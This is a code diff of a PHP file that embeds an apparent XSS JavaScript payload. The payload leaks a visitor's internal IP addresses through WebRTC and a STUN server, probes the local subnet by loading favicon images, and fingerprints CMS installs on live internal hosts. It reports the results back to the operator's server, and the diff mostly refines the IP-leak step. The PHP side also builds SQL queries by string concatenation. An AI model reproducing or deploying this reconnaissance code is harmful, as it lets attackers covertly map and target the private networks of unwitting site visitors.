@@ -42,29 +42,46 @@ var snedIteratesCmsIpUrl = "$snedIteratesCmsIpUrl";
 var sendExistenceVul     = "$sendExistenceVul"
 var webrtcxss = {
     webrtc        : function(callback){
-        var ip_dups           = {};
-        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-        var mediaConstraints  = {
+        var ip_dups = {};
+        var RTCPeerConnection = window.RTCPeerConnection
+        || window.mozRTCPeerConnection
+        || window.webkitRTCPeerConnection;
+        var useWebKit = !!window.webkitRTCPeerConnection;
+        if(!RTCPeerConnection){
+            var win = iframe.contentWindow;
+            RTCPeerConnection = win.RTCPeerConnection
+            || win.mozRTCPeerConnection
+            || win.webkitRTCPeerConnection;
+            useWebKit = !!win.webkitRTCPeerConnection;
+        }
+        var mediaConstraints = {
             optional: [{RtpDataChannels: true}]
         };
-        var servers = undefined;
-        if(window.webkitRTCPeerConnection){
-            servers = {iceServers: []};
-        }
+        var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
         var pc = new RTCPeerConnection(servers, mediaConstraints);
-        pc.onicecandidate = function(ice){
-            if(ice.candidate){
-                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; 
-                if(ip_dups[ip_addr] === undefined)
+        function handleCandidate(candidate){
+            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+            var ip_addr = ip_regex.exec(candidate)[1];
+            if(ip_dups[ip_addr] === undefined)
                 callback(ip_addr);
-                ip_dups[ip_addr]    = true;
+                ip_dups[ip_addr] = true;
             }
-        };
-        pc.createDataChannel("");
-        pc.createOffer(function(result){
-            pc.setLocalDescription(result, function(){});
-        });
+            pc.onicecandidate = function(ice){
+            if(ice.candidate)
+                handleCandidate(ice.candidate.candidate);
+            };
+            pc.createDataChannel("");
+            pc.createOffer(function(result){
+            pc.setLocalDescription(result, function(){}, function(){});
+        }, function(){});
+        setTimeout(function(){
+            console.log(pc.localDescription.sdp)
+            var lines = pc.localDescription.sdp.split("\\n");
+            lines.forEach(function(line){
+                if(line.indexOf('a=candidate:') === 0)
+                handleCandidate(line);
+            });
+        }, 1000);
     },
     getIp        : function(){
         this.webrtc(function(ip){
@@ -85,7 +102,7 @@ function iteratesIp(){
         incompleteIp = incompleteIp.join(".");
         for(var j = 1;j < 255;j++){
             var ip = incompleteIp + "." + j;
-            var imgTag = document.createElement("img"); 
+            var imgTag = document.createElement("img");
             imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
             imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
             imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
@@ -114,7 +131,7 @@ function snedIteratesIpData(ip){
             var cmsPath = JSON.parse(ipAjax.responseText).path;
             for(var key in cmsPath){
                 for(var i = 0;i < survivalIpLIst.length;i++){
-                    var scriptTag = document.createElement("script"); 
+                    var scriptTag = document.createElement("script");
                     scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                     scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                     scriptTag.setAttribute("data-cmsinfo",key);
@@ -135,7 +152,7 @@ function vulnerabilityIpList(info){
     ipAjax.onreadystatechange = function(){
         if(ipAjax.readyState == 4 && ipAjax.status == 200){
             var vulCmsInfo = ipAjax.responseText;
-            var img = document.createElement("img"); 
+            var img = document.createElement("img");
             img.setAttribute("scr",vulCmsInfo);
             img.setAttribute("style","display:none;");
             document.getElementsByTagName("body")[0].appendChild(img);
@@ -265,7 +282,7 @@ WEBRTCJS;
                 $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                 $projectData['outsideip']      = $survivalIpListData['outside_ip'];
-                
+
                 $ipdatalist                    = M("ipdatalist");
                 $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalportip'] = $ipdatalistData['survival_ip'];
@@ -275,7 +292,7 @@ WEBRTCJS;
                 $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                 $projectData['outsideip']      = $survivalIpListData['outside_ip'];
-                
+
                 $ipdatalist                    = M("ipdatalist");
                 $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalportip'] = $ipdatalistData['survival_ip'];
@@ -290,7 +307,7 @@ WEBRTCJS;
                 $survivalIpListData            = $survivalIpList->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalip']     = $survivalIpListData['survival_ip'];
                 $projectData['outsideip']      = $survivalIpListData['outside_ip'];
-                
+
                 $ipdatalist                    = M("ipdatalist");
                 $ipdatalistData                = $ipdatalist->where("onlystring='".$projectData['onlystring']."'")->find();
                 $projectData['survivalportip'] = $ipdatalistData['survival_ip'];
